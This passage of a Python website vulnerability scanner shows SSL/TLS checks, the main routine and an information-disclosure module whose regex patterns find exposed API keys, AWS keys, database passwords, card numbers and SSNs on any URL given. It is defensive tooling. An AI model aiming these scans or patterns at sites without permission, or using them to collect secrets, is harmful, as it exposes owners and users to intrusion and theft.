                        vulnerabilities.append(redirect_vuln)
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error checking HTTP to HTTPS redirection: {str(e)}")
            
            # Get actual target URL headers
            response = requests.get(
                self.target_url,
                headers=self.headers,
                timeout=self.timeout
            )
            
            # Check headers
            header_vulnerabilities = self._analyze_header_values(response.headers)
            vulnerabilities.extend(header_vulnerabilities)
            
            # Check cookies
            cookie_vulnerabilities = self._analyze_cookie_security(response.cookies)
            vulnerabilities.extend(cookie_vulnerabilities)
            
            if self.verbose and self.logger:
                self.logger.info(f"Found {len(vulnerabilities)} HTTP header vulnerabilities")
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during HTTP header scan: {str(e)}")
        
        return vulnerabilities

###########################################
# SSL/TLS SCANNER
###########################################

class SSLTLSScanner:
    """Scanner for SSL/TLS vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the SSL/TLS scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Socket timeout in seconds
            depth (int): Not used for SSL scanning but required for consistency
            user_agent (str): Not used for SSL scanning but required for consistency
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.logger = logger
        self.verbose = verbose
        
        # Parse the URL to get the hostname and port
        parsed_url = urlparse(target_url)
        self.hostname = parsed_url.netloc.split(':')[0]
        
        # Determine port based on scheme or explicit port in URL
        if ':' in parsed_url.netloc:
            self.port = int(parsed_url.netloc.split(':')[1])
        else:
            self.port = 443 if parsed_url.scheme == 'https' else 80
        
        # Map of vulnerable SSL/TLS protocol versions
        # Modern Python versions have removed SSLv2 and SSLv3 protocol constants
        # Using a dictionary with protocol names as keys instead of protocol constants
        self.vulnerable_protocols = {
            'SSLv3': {
                'name': 'SSLv3',
                'protocol': getattr(ssl, 'PROTOCOL_SSLv3', None),
                'severity': 'Critical',
                'description': 'SSLv3 is vulnerable to POODLE attack',
                'recommendation': 'Disable SSLv3 on the server'
            },
            'TLSv1.0': {
                'name': 'TLSv1.0',
                'protocol': getattr(ssl, 'PROTOCOL_TLSv1', None),
                'severity': 'High',
                'description': 'TLSv1.0 is outdated and potentially insecure',
                'recommendation': 'Disable TLSv1.0 on the server'
            },
            'TLSv1.1': {
                'name': 'TLSv1.1',
                'protocol': getattr(ssl, 'PROTOCOL_TLSv1_1', None),
                'severity': 'Medium',
                'description': 'TLSv1.1 is outdated and should be upgraded',
                'recommendation': 'Upgrade to TLSv1.2 or TLSv1.3'
            }
        }
        
        # Weak ciphers to check for
        self.weak_ciphers = [
            {
                'name': 'NULL',
                'severity': 'Critical',
                'description': 'NULL ciphers provide no encryption',
                'keywords': ['NULL']
            },
            {
                'name': 'RC4',
                'severity': 'Critical',
                'description': 'RC4 encryption is broken and insecure',
                'keywords': ['RC4']
            },
            {
                'name': 'DES',
                'severity': 'Critical',
                'description': 'DES and Triple DES (3DES) are weak and outdated',
                'keywords': ['DES', '3DES']
            },
            {
                'name': 'MD5',
                'severity': 'High',
                'description': 'MD5 hashing is cryptographically broken',
                'keywords': ['MD5']
            },
            {
                'name': 'Export',
                'severity': 'Critical',
                'description': 'Export-grade cipher suites are deliberately weakened',
                'keywords': ['EXPORT', 'EXP']
            },
            {
                'name': 'Anonymous',
                'severity': 'Critical',
                'description': 'Anonymous cipher suites provide no authentication',
                'keywords': ['ADH', 'AECDH', 'ANON']
            }
        ]
    
    def _check_certificate(self, cert):
        """
        Check SSL certificate for issues.
        
        Args:
            cert (certificate object): SSL certificate to check
            
        Returns:
            list: List of vulnerabilities found in the certificate
        """
        vulnerabilities = []
        current_date = datetime.now()
        
        # Check expiration
        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        not_before = datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
        
        # Certificate expired
        if current_date > not_after:
            vulnerability = {
                'type': 'SSL Certificate',
                'url': self.target_url,
                'issue': 'Expired Certificate',
                'details': f"Certificate expired on {not_after.strftime('%Y-%m-%d')}",
                'severity': 'Critical',
                'recommendation': 'Renew the SSL certificate immediately'
            }
            vulnerabilities.append(vulnerability)
            
            if self.logger:
                self.logger.warning(f"SSL Certificate has expired: {not_after.strftime('%Y-%m-%d')}")
        
        # Certificate not yet valid
        if current_date < not_before:
            vulnerability = {
                'type': 'SSL Certificate',
                'url': self.target_url,
                'issue': 'Certificate Not Valid Yet',
                'details': f"Certificate not valid until {not_before.strftime('%Y-%m-%d')}",
                'severity': 'Critical',
                'recommendation': 'Check certificate validity dates and timezone settings'
            }
            vulnerabilities.append(vulnerability)
            
            if self.logger:
                self.logger.warning(f"SSL Certificate not yet valid: {not_before.strftime('%Y-%m-%d')}")
        
        # Certificate expiring soon (30 days)
        days_until_expiry = (not_after - current_date).days
        if 0 < days_until_expiry <= 30:
            vulnerability = {
                'type': 'SSL Certificate',
                'url': self.target_url,
                'issue': 'Certificate Expiring Soon',
                'details': f"Certificate expires in {days_until_expiry} days ({not_after.strftime('%Y-%m-%d')})",
                'severity': 'Medium',
                'recommendation': 'Plan to renew the SSL certificate soon'
            }
            vulnerabilities.append(vulnerability)
            
            if self.logger:
                self.logger.warning(f"SSL Certificate expiring soon: {days_until_expiry} days")
        
        # Check if certificate matches hostname
        try:
            cert_cn = cert['subject'][0][0][1]
            
            if cert_cn != self.hostname and not cert_cn.startswith('*'):
                # Try to check for Subject Alternative Names
                alt_names = []
                for i in range(len(cert['extensions'])):
                    if cert['extensions'][i]['name'] == 'subjectAltName':
                        alt_names = cert['extensions'][i]['value'].split(', ')
                        break
                
                hostname_matched = False
                for name in alt_names:
                    if name.startswith('DNS:'):
                        dns_name = name[4:]
                        if dns_name == self.hostname or (dns_name.startswith('*') and self.hostname.endswith(dns_name[1:])):
                            hostname_matched = True
                            break
                
                if not hostname_matched:
                    vulnerability = {
                        'type': 'SSL Certificate',
                        'url': self.target_url,
                        'issue': 'Hostname Mismatch',
                        'details': f"Certificate subject '{cert_cn}' doesn't match hostname '{self.hostname}'",
                        'severity': 'Medium',
                        'recommendation': 'Obtain a certificate that matches the hostname'
                    }
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"SSL Certificate hostname mismatch: {cert_cn} != {self.hostname}")
        
        except (KeyError, IndexError):
            pass
        
        # Check for weak signature algorithm
        try:
            signature_algorithm = cert['signatureAlgorithm']
            
            if 'md5' in signature_algorithm.lower() or 'sha1' in signature_algorithm.lower():
                vulnerability = {
                    'type': 'SSL Certificate',
                    'url': self.target_url,
                    'issue': 'Weak Signature Algorithm',
                    'details': f"Certificate uses weak signature algorithm: {signature_algorithm}",
                    'severity': 'High',
                    'recommendation': 'Replace with a certificate that uses SHA-256 or stronger'
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"SSL Certificate uses weak algorithm: {signature_algorithm}")
        
        except KeyError:
            pass
        
        # Check for self-signed certificate
        try:
            issuer = cert['issuer']
            subject = cert['subject']
            
            if issuer == subject:
                vulnerability = {
                    'type': 'SSL Certificate',
                    'url': self.target_url,
                    'issue': 'Self-Signed Certificate',
                    'details': 'Certificate is self-signed, not issued by a trusted CA',
                    'severity': 'High',
                    'recommendation': 'Replace with a certificate from a trusted CA'
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning("SSL Certificate is self-signed")
        
        except KeyError:
            pass
        
        return vulnerabilities
    
    def _check_protocols(self):
        """
        Check for supported SSL/TLS protocols.
        
        Returns:
            list: List of vulnerabilities related to SSL/TLS protocols
        """
        vulnerabilities = []
        
        # Skip if not HTTPS
        if self.port != 443:
            return []
        
        # Check each vulnerable protocol
        for protocol_name, info in self.vulnerable_protocols.items():
            # Skip if protocol constant is not available in this Python version
            if info['protocol'] is None:
                if self.verbose and self.logger:
                    self.logger.info(f"Protocol {info['name']} check skipped (not supported by this Python version)")
                continue
                
            try:
                if info['protocol'] is None:
                    continue
                    
                context = ssl.SSLContext(info['protocol'])
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with socket.create_connection((self.hostname, self.port), self.timeout) as sock:
                    with context.wrap_socket(sock, server_hostname=self.hostname) as ssl_sock:
                        if self.verbose and self.logger:
                            self.logger.info(f"Protocol {info['name']} is supported")
                        
                        vulnerability = {
                            'type': 'Insecure Protocol',
                            'url': self.target_url,
                            'protocol': info['name'],
                            'details': info['description'],
                            'severity': info['severity'],
                            'recommendation': info['recommendation']
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"Insecure protocol supported: {info['name']}")
            
            except (ssl.SSLError, socket.error, OSError):
                # Protocol not supported (good) or error connecting
                if self.verbose and self.logger:
                    self.logger.info(f"Protocol {info['name']} is not supported")
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error checking protocol {info['name']}: {str(e)}")
        
        return vulnerabilities
    
    def _check_cipher_suites(self):
        """
        Check for weak cipher suites.
        
        Returns:
            list: List of vulnerabilities related to weak cipher suites
        """
        vulnerabilities = []
        
        # Skip if not HTTPS
        if self.port != 443:
            return []
        
        try:
            # Use OpenSSL to get supported ciphers
            with socket.create_connection((self.hostname, self.port), self.timeout) as sock:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with context.wrap_socket(sock, server_hostname=self.hostname) as ssl_sock:
                    # Get cipher info
                    cipher = ssl_sock.cipher()
                    if cipher:
                        cipher_name = cipher[0]
                        
                        # Check if the current cipher is weak
                        for weak_cipher in self.weak_ciphers:
                            if any(keyword in cipher_name for keyword in weak_cipher['keywords']):
                                vulnerability = {
                                    'type': 'Weak Cipher',
                                    'url': self.target_url,
                                    'cipher': cipher_name,
                                    'details': weak_cipher['description'],
                                    'severity': weak_cipher['severity'],
                                    'recommendation': f"Disable {weak_cipher['name']} cipher suites"
                                }
                                vulnerabilities.append(vulnerability)
                                
                                if self.logger:
                                    self.logger.warning(f"Weak cipher supported: {cipher_name}")
                                
                                break
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error checking cipher suites: {str(e)}")
        
        return vulnerabilities
    
    def scan(self):
        """
        Start the SSL/TLS security scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting SSL/TLS scan on {self.target_url}")
        
        # Skip if HTTP (non-SSL)
        parsed_url = urlparse(self.target_url)
        if parsed_url.scheme != 'https':
            if self.verbose and self.logger:
                self.logger.info(f"Skipping SSL/TLS scan for non-HTTPS URL: {self.target_url}")
            
            # Add a vulnerability for not using HTTPS
            vulnerability = {
                'type': 'Insecure Protocol',
                'url': self.target_url,
                'protocol': 'HTTP',
                'details': 'Site uses HTTP instead of HTTPS',
                'severity': 'High',
                'recommendation': 'Implement HTTPS with a valid SSL certificate'
            }
            vulnerabilities.append(vulnerability)
            
            if self.logger:
                self.logger.warning("Site uses insecure HTTP protocol")
            
            return vulnerabilities
        
        try:
            # Check SSL Certificate
            try:
                with socket.create_connection((self.hostname, self.port), self.timeout) as sock:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    with context.wrap_socket(sock, server_hostname=self.hostname) as ssl_sock:
                        # Get certificate in dictionary form
                        cert_dict = ssl_sock.getpeercert()
                        
                        # Check the certificate with our built-in methods
                        if cert_dict:
                            cert_vulnerabilities = self._check_certificate(cert_dict)
                            vulnerabilities.extend(cert_vulnerabilities)
                        else:
                            if self.logger:
                                self.logger.warning("Could not get certificate details")
            
            except (ssl.SSLError, socket.error) as e:
                if self.logger:
                    self.logger.error(f"Error checking SSL certificate: {str(e)}")
            
            # Check SSL/TLS protocols
            protocol_vulnerabilities = self._check_protocols()
            vulnerabilities.extend(protocol_vulnerabilities)
            
            # Check cipher suites
            cipher_vulnerabilities = self._check_cipher_suites()
            vulnerabilities.extend(cipher_vulnerabilities)
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during SSL/TLS scan: {str(e)}")
        
        return vulnerabilities

###########################################
# INFORMATION DISCLOSURE SCANNER
###########################################

class InfoDisclosureScanner:
    """Scanner for detecting sensitive information disclosure."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the Information Disclosure scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # Regex patterns for sensitive information
        self.patterns = {
            # Developer comments
            'HTML Comments': {
                'regex': r'<!--(?!\[if).*?-->',
                'severity': 'Low'
            },
            
            # Email addresses
            'Email Address': {
                'regex': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b',
                'severity': 'Medium'
            },
            
            # API keys and tokens (generic patterns)
            'API Key': {
                'regex': r'\b(?:api[_-]?key|apikey|api[_-]?token|access[_-]?token)["\']?\s*[=:]\s*["\']([\w\-]{16,})["\'"]',
                'severity': 'Critical'
            },
            
            # AWS Access Keys
            'AWS Access Key': {
                'regex': r'\b(?:AKIA[0-9A-Z]{16})\b',
                'severity': 'Critical'
            },
            
            # AWS Secret Keys
            'AWS Secret Key': {
                'regex': r'\b(?:[0-9a-zA-Z/+]{40})\b',
                'severity': 'Critical'
            },
            
            # Connection strings
            'Connection String': {
                'regex': r'(?:connection[_-]?string|conn[_-]?str)["\']?\s*[=:]\s*["\'](.*?)["\']',
                'severity': 'Critical'
            },
            
            # Database connection details
            'Database Details': {
                'regex': r'(?:host|server|database|dbname|db_name|user|username|password|passwd|pwd)["\']?\s*[=:]\s*["\'](.*?)["\']',
                'severity': 'High'
            },
            
            # Credit card numbers
            'Credit Card': {
                'regex': r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b',
                'severity': 'Critical'
            },
            
            # Social security numbers (US)
            'Social Security Number': {
                'regex': r'\b\d{3}-\d{2}-\d{4}\b',
                'severity': 'Critical'
            },
            
            # IP addresses (private/internal)
            'Internal IP': {
                'regex': r'\b(?:127\.\d{1,3}\.\d{1,3}\.\d{1,3}|10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b',
                'severity': 'Medium'
            },
            
            # File system paths
            'File Path': {
                'regex': r'\b(?:/[a-zA-Z0-9_.-]+)+|[A-Za-z]:\\\\[A-Za-z0-9_.-\\\\]+',
                'severity': 'Medium'
            },
            
            # Stack traces and errors
            'Stack Trace': {
                'regex': r'(?:stack trace|stacktrace|call stack):|at\s+[\w\.$]+\([^)]*\)|Exception\s+in\s+|throw\s+new\s+|Microsoft SQL Server\s+error|mysqli_error|mysql_error|pg_query|sqlite3_exec|ORA-\d{5}|error\s+occurred|SQL syntax|SQL statement|Warning: \w+\(\)',
                'severity': 'High'
            },
            
            # JWT Tokens
            'JWT Token': {
                'regex': r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
                'severity': 'High'
            },
            
            # Version information
            'Version Information': {
                'regex': r'(?:version|v)[\s="\']+([0-9]+(?:\.[0-9]+)+)',
                'severity': 'Low'
            },
            
            # Debug flags or statements
            'Debug Information': {
                'regex': r'(?:DEBUG|TRACE|TODO|FIXME)(?:\s+|:)',
                'severity': 'Medium'
            }
        }
        
        # Compile all regex patterns
        for key, info in self.patterns.items():
            info['compiled'] = re.compile(info['regex'], re.IGNORECASE | re.MULTILINE)
            # Store original regex string for later use
            info['regex_str'] = info['regex']
    
    def _extract_page_content(self, url):
        """
        Extract the content of a webpage using trafilatura if available,
        otherwise just use the raw HTML.
        
        Args:
            url (str): The URL to extract content from
            
        Returns:
            tuple: (raw_html, extracted_text) or (None, None) if error
        """
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            if response.status_code != 200:
                return None, None
            
            raw_html = response.text
            
            # Try to extract main content using trafilatura if available
            extracted_text = None
            if TRAFILATURA_AVAILABLE:
                try:
                    extracted_text = trafilatura.extract(raw_html)
                except Exception:
                    pass
            
            return raw_html, extracted_text
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting content from {url}: {str(e)}")
            return None, None
    
    def _extract_links(self, url, html):
        """
        Extract all links from the HTML content.
        
        Args:
            url (str): The base URL
            html (str): HTML content
            
        Returns:
            list: List of absolute URLs found
        """
        if not html:
            return []
        
        links = []
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            # Extract links from anchor tags
            for a_tag in soup.find_all('a', href=True):
                link = urljoin(url, a_tag['href'])
                # Only include links on the same domain
                parsed_url = urlparse(url)
                parsed_link = urlparse(link)
                
                if parsed_url.netloc == parsed_link.netloc and link not in links:
                    links.append(link)
            
            # Limit number of links based on depth
            max_links = min(len(links), 5 * self.depth)
            return links[:max_links]
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting links from {url}: {str(e)}")
            return []
    
    def _scan_content(self, url, html, text):
        """
        Scan page content for sensitive information.
        
        Args:
            url (str): The URL being scanned
            html (str): Raw HTML content
            text (str): Extracted text content
            
        Returns:
            list: List of findings
        """
        findings = []
        
        if not html:
            return findings
        
        # Use HTML for all scans
        content_to_scan = html
        
        # Check each pattern
        for pattern_name, pattern_info in self.patterns.items():
            try:
                # Use compiled regex pattern to find matches
                compiled_pattern = pattern_info['compiled']
                matches = compiled_pattern.findall(content_to_scan)
                
                # Filter matches to remove false positives
                filtered_matches = []
                
                for match in matches:
                    # Convert match to string if it's a tuple
                    match_str = match if isinstance(match, str) else match[0]
                    
                    # Skip common false positives
                    skip_match = False
                    
                    if pattern_name == 'Email Address':
                        if 'example.com' in match_str or 'user@domain' in match_str:
                            skip_match = True
                    
                    elif pattern_name == 'Internal IP':
                        if match_str in ['127.0.0.1']:
                            skip_match = True
                    
                    elif pattern_name == 'File Path':
                        # Skip common web paths like /js/, /css/, /images/
                        if re.match(r'^(/js/|/css/|/img/|/images/|/static/|/assets/)', match_str):
                            skip_match = True
                    
                    # Add to filtered matches if not skipped
                    if not skip_match:
                        filtered_matches.append(match_str)
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error analyzing pattern {pattern_name}: {str(e)}")
                continue
            
            # If we have matches, add a finding
            if filtered_matches:
                # Limit the number of matches shown
                samples = filtered_matches[:3]
                samples_str = ', '.join(samples)
                
                if len(filtered_matches) > 3:
                    samples_str += f" and {len(filtered_matches) - 3} more"
                
                severity = pattern_info['severity']
                category = pattern_name
                
                finding = {
                    'type': 'Information Disclosure',
                    'url': url,
                    'category': category,
                    'matches': samples,
                    'details': f"Found {category}: {samples_str}",
                    'severity': severity,
                    'recommendation': f"Remove {category.lower()} from the page source"
                }
                findings.append(finding)
                
                if self.logger:
                    self.logger.warning(f"Information disclosure found: {category} on {url}")
        
        return findings
    
    def _determine_severity(self, category):
        """
        Determine the severity level based on the finding category.
        
        Args:
            category (str): The finding category
            
        Returns:
            str: Severity level (Critical, High, Medium, Low, Info)
        """
        critical_categories = ['API Key', 'AWS Access Key', 'AWS Secret Key', 'Connection String', 'Credit Card', 'Social Security Number']
        high_categories = ['Database Details', 'Stack Trace', 'JWT Token']
        medium_categories = ['Email Address', 'Internal IP', 'File Path', 'Debug Information']
        
        if category in critical_categories:
            return 'Critical'
        elif category in high_categories:
            return 'High'
        elif category in medium_categories:
            return 'Medium'
        else:
            return 'Low'
    
    def scan(self):
        """
        Start the information disclosure scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting information disclosure scan on {self.target_url}")
        
        # Scan the main page
        html, text = self._extract_page_content(self.target_url)
        if html:
            findings = self._scan_content(self.target_url, html, text)
            vulnerabilities.extend(findings)
            
            # Extract and scan linked pages if depth allows
            if self.depth > 1:
                links = self._extract_links(self.target_url, html)
                
                if self.verbose and self.logger:
                    self.logger.info(f"Found {len(links)} links to scan")
                
                # Limit the number of links to scan based on depth
                max_links = min(len(links), 5 * self.depth)
                links_to_scan = links[:max_links]
                
                # Scan each link
                for link in links_to_scan:
                    if self.verbose and self.logger:
                        self.logger.info(f"Scanning link: {link}")
                    
                    link_html, link_text = self._extract_page_content(link)
                    if link_html:
                        link_findings = self._scan_content(link, link_html, link_text)
                        vulnerabilities.extend(link_findings)
        
        if self.logger:
            self.logger.info(f"Completed information disclosure scan, found {len(vulnerabilities)} vulnerabilities")
        
        return vulnerabilities

###########################################
# MAIN FUNCTION
###########################################

def print_banner():
    """Display the tool banner."""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║  {Fore.WHITE}██╗    ██╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗{Fore.CYAN}  ║
║  {Fore.WHITE}██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║{Fore.CYAN}  ║
║  {Fore.WHITE}██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║{Fore.CYAN}  ║
║  {Fore.WHITE}██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██║██║╚██╗██║{Fore.CYAN}  ║
║  {Fore.WHITE}╚███╔███╔╝███████╗██████╔╝███████║╚██████╗██║  ██║██║ ╚████║{Fore.CYAN}  ║
║  {Fore.WHITE} ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝{Fore.CYAN}  ║
║                                                                  ║
║  {Fore.GREEN}Advanced Website Vulnerability Scanner                        {Fore.CYAN}║
║  {Fore.YELLOW}Version 1.0.0                                                 {Fore.CYAN}║
║  {Fore.MAGENTA}Developed by AMKUSH                                           {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description='Advanced Website Vulnerability Scanner',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('url', help='Target URL to scan (e.g., https://example.com)')
    
    parser.add_argument('-o', '--output', 
                        help='Output file for the scan report (default: webscan_report.txt)',
                        default='webscan_report.txt')
    
    parser.add_argument('-t', '--threads', 
                        help='Number of threads to use (default: 5)',
                        type=int, default=5)
    
    parser.add_argument('-d', '--depth', 
                        help='Scan depth - number of levels to crawl (default: 2)',
                        type=int, default=2)
    
    parser.add_argument('-c', '--crawl', 
                        help='Crawl the website for links before scanning',
                        action='store_true')
    
    parser.add_argument('--timeout', 
                        help='Request timeout in seconds (default: 10)',
                        type=int, default=10)
    
    parser.add_argument('-v', '--verbose', 
                        help='Enable verbose output',
                        action='store_true')
    
    parser.add_argument('--scan-type', 
                        help='''Specify scan types (comma-separated):
all: All scan types (default)
sqli: SQL Injection
xss: Cross-Site Scripting
port: Open Port Scanning
dir: Directory Traversal
files: Sensitive Files
headers: HTTP Headers
ssl: SSL/TLS
info: Information Disclosure''',
                        default='all')
    
    parser.add_argument('--user-agent', 
                        help='Custom User-Agent string',
                        default='WebScan/1.0.0')
    
    parser.add_argument('--log-file', 
                        help='Log file path (default: webscan.log)',
                        default='webscan.log')
    
    parser.add_argument('--no-color', 
                        help='Disable colored output',
                        action='store_true')
    
    args = parser.parse_args()
    
    # Validate URL
    parsed_url = urlparse(args.url)
    if not parsed_url.scheme or not parsed_url.netloc:
        parser.error(f"Invalid URL format: {args.url}")
    
    # Process scan types
    if args.scan_type == 'all':
        args.scan_types = ['sqli', 'xss', 'port', 'dir', 'files', 'headers', 'ssl', 'info']
    else:
        args.scan_types = [s.strip() for s in args.scan_type.split(',')]
        valid_types = ['sqli', 'xss', 'port', 'dir', 'files', 'headers', 'ssl', 'info']
        for scan_type in args.scan_types:
            if scan_type not in valid_types:
                parser.error(f"Invalid scan type: {scan_type}")
    
    # Disable colors if requested
    if args.no_color:
        init(autoreset=True, strip=True)
    
    return args

def run_scanner(scanner_class, target_url, args, results, logger):
    """Run a specific scanner module and collect results."""
    scanner_name = scanner_class.__name__
    try:
        logger.info(f"Starting {scanner_name} scan on {target_url}")
        scanner = scanner_class(
            target_url=target_url,
            timeout=args.timeout,
            depth=args.depth,
            user_agent=args.user_agent,
            logger=logger,
            verbose=args.verbose
        )
        scan_results = scanner.scan()
        results.extend(scan_results)
        logger.info(f"Completed {scanner_name} scan on {target_url}")
    except Exception as e:
        logger.error(f"Error during {scanner_name} scan: {str(e)}")
        print(f"{Fore.RED}[ERROR] {scanner_name} scan failed: {str(e)}")

def main():
    """Main function to run the vulnerability scanner."""
    print_banner()
    args = parse_arguments()
    
    logger = setup_logger(args.log_file, logging.DEBUG if args.verbose else logging.INFO, args.no_color)
    logger.info(f"Starting scan on {args.url}")
    
    start_time = time.time()
    
    # Check if URL is accessible
    print(f"{Fore.CYAN}[INFO] Checking target URL accessibility...")
    if not is_url_accessible(args.url, args.timeout):
        print(f"{Fore.RED}[ERROR] Target URL {args.url} is not accessible.")
        logger.error(f"Target URL {args.url} is not accessible")
        sys.exit(1)
    
    print(f"{Fore.GREEN}[SUCCESS] Target URL is accessible")
    print(f"{Fore.CYAN}[INFO] Starting vulnerability scan on {args.url}")
    print(f"{Fore.CYAN}[INFO] Scan types: {', '.join(args.scan_types)}")
    
    # Initialize Reporter
    reporter = Reporter(args.output)
    reporter.start_report(args.url, args.scan_types)
    
    # Collection of scanner classes to use based on scan types
    scanner_map = {
        'sqli': SQLInjectionScanner,
        'xss': XSSScanner,
        'port': PortScanner,
        'dir': DirectoryTraversalScanner,
        'files': SensitiveFileScanner,
        'headers': HTTPHeaderScanner,
        'ssl': SSLTLSScanner,
        'info': InfoDisclosureScanner
    }
    
    # Select scanners based on requested types
    scanners_to_run = [scanner_map[scan_type] for scan_type in args.scan_types if scan_type in scanner_map]
    
    # Results collection
    all_results = []
    
    # Run scanners with multi-threading
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_scanner = {
            executor.submit(run_scanner, scanner_class, args.url, args, all_results, logger): scanner_class.__name__
            for scanner_class in scanners_to_run
        }
        
        # Process results as they complete
        for future in concurrent.futures.as_completed(future_to_scanner):
            scanner_name = future_to_scanner[future]
            try:
                future.result()  # Get any exceptions that may have been raised
                print(f"{Fore.GREEN}[COMPLETE] {scanner_name} scan finished")
            except Exception as e:
                print(f"{Fore.RED}[ERROR] {scanner_name} scan failed: {str(e)}")
    
    # Generate report
    reporter.add_vulnerabilities(all_results)
    report_path = reporter.finalize_report(time.time() - start_time)
    
    # Summary
    total_time = time.time() - start_time
    vulnerabilities_count = len(all_results)
    
    print(f"\n{Fore.CYAN}{'=' * 60}")
    print(f"{Fore.CYAN}[SCAN SUMMARY]")
    print(f"{Fore.CYAN}{'=' * 60}")
    print(f"{Fore.WHITE}Target URL: {args.url}")
    print(f"{Fore.WHITE}Scan Duration: {total_time:.2f} seconds")
    print(f"{Fore.WHITE}Vulnerabilities Found: {vulnerabilities_count}")
    print(f"{Fore.WHITE}Report saved to: {report_path}")
    print(f"{Fore.CYAN}{'=' * 60}\n")
    
    if vulnerabilities_count > 0:
        severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0, 'Info': 0}
        for result in all_results:
            severity_counts[result['severity']] = severity_counts.get(result['severity'], 0) + 1
        
        print(f"{Fore.CYAN}[VULNERABILITY SUMMARY]")
        for severity, count in severity_counts.items():
            if count > 0:
                color = Fore.RED if severity in ['Critical', 'High'] else (
                    Fore.YELLOW if severity == 'Medium' else (
                        Fore.BLUE if severity == 'Low' else Fore.WHITE
                    )
                )
                print(f"{color}{severity}: {count}")
    
    logger.info(f"Scan completed. Found {vulnerabilities_count} vulnerabilities. Report saved to {report_path}")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())

